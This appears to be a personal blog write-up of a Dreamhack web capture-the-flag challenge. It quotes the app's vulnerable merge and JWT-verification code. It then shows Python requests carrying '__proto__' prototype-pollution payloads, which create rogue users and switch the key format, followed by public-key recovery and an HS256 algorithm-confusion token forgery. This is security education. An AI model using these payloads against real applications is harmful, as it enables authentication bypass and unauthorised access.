---
title: themeviewer
date: 2025-10-14 09:56:00 +0800
categories: [Cybersecurity]
tags: [dreamhack, web]
description: Level 6 web exploitation challenge on Dreamhack.io
---

### The Challenge
[https://dreamhack.io/wargame/challenges/1726](https://dreamhack.io/wargame/challenges/1726)

![](/assets/img/posts/themeviewer/img1.png)
*No description... very mysterious*

A quick scan through `index.js` shows an obvious prototype pollution vector:

```js
class ThemeManager {
    static merge(target, source) {
        for (let key in source) {
            if (source[key] && typeof source[key] === 'object') {
                target[key] = target[key] || {};
                this.merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
        return target;
    }
    static createTheme(base, customizations = {}) {
        const theme = base ? { ...default_theme[base] } : {};
        return this.merge(theme, customizations);
    }
}
```

Here is the authentication logic; we need to authenticate as `admin` to get the flag.

```js
let users = {
    admin: "REDACTED"
}

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username in users && users[username] === password) {
        const payload = {
            user: username,
        };
        const token = jwt.sign(payload, parseKey("private", PRIVATE_KEY, { format: "pkcs8" }), { algorithm: 'ES256' });
        res.cookie('token', token)
        res.json({ token });
    } else {
        res.status(401).json({ error: 'invalid credentials' });
    }
});
```

It's not possible to pollute `admin` to whatever we want, as `admin` is already set in the `users` object.

However, we observe that it is possible to create our own user using prototype pollution, whom we can login as.

I also remembered from past challenges that it's possible to derive the public key of a JWT if you have a JWT signed using its private key.

First, we create 2 users to get 2 JWTs:

```py
json_data = {
    "base": "light",
    "customizations": {
      "__proto__": {
          "user1": "user1"
      }
    }
}
response = requests.post('http://host8.dreamhack.games:14687/api/theme', json=json_data, verify=False)

json_data = {
    "base": "light",
    "customizations": {
      "__proto__": {
          "user2": "user2"
      }
    }
}
response = requests.post('http://host8.dreamhack.games:14687/api/theme', json=json_data, verify=False)
```

Next, we use this tool I found to recover the public key:

![](/assets/img/posts/themeviewer/img2.png)
*Recovering the public key*

I converted the public key recovered from above into this format (as seen in the challenge file):

```
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEjA20wIyE3BEQNyG8bHfFhwDdZKNnJ1EPdNnjpe406wSY1MKT+o+kJ+dCTo7NJYPEFr/t6VJeK5F0UQQQl2r1o=
```

Looking at this part of `index.js`, we realize that a JWT algorithm confusion attack is possible as the function doesn't take in an `algorithms` argument.

```js
app.get('/admin', (req, res) => {
    const token = req.cookies["token"]
    try {
        const decoded = jwt.verify(token, parseKey("public", PUBLIC_KEY));

        if (decoded.user === 'admin') {
            res.render('admin', { flag: 'WaRP{REDACTED}' });
        } else {
            res.status(403).json({ error: 'access denied' });
        }
    } catch (err) {
        res.status(401).json({ error: 'invalid token' });
    }
});
```

However, submitting a JWT with a `HS256` algorithm in the header produces this error:

![](/assets/img/posts/themeviewer/img3.png)
*Error produced attempting a JWT algorithm confusion attack*

This is proabably because the JWT library has put in place measures to prevent algorithm confusion attacks, depending on the contents of the key fed into the `verify` function. The key that `parseKey` was returning was:

```
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAESMDbTAjITcERA3Ibxsd8WHAN1ko2
cnUQ902eOl7jTrBJjUwpP6j6Qn50JOjs0lg8QWv+3pUl4rkXRRBBCXavWg==
-----END PUBLIC KEY-----
```

```js
const parseKey = (keytype, Key, options = {}) => {
    let key
    if (keytype === "private") {
        key = sshpk.parsePrivateKey(Key, 'ssh');
    } else {
        key = sshpk.parseKey(Key, 'ssh', { filename: "publickey" });
    }
    return key.toString(options.format || 'pkcs8')
}
```

The JWT library detects that using `HS256` with this key just doesn't make sense and throws an error. (This is probably some safety mechanism by the JWT library)

However, as `options` is an empty object in the `parseKey` function call, prototype pollution comes into play once again.

We can set `options.format` to something like `openssh`, and this causes the key coming from `parseKey` to be compatible with `HS256` in our JWT.

```py
json_data = {
    "base": "light",
    "customizations": {
      "__proto__": {
          "format": "openssh"
      }
    }
}
response = requests.post('http://host8.dreamhack.games:14687/api/theme', json=json_data, verify=False)
```

Lastly, all we have to do is to convert the public key into the openssh format, and create a JWT token using the `HS256` algorithm with the new public key.

Setting the new JWT as my `token` cookie, I solved the challenge.

![](/assets/img/posts/themeviewer/img4.png)
*Win!*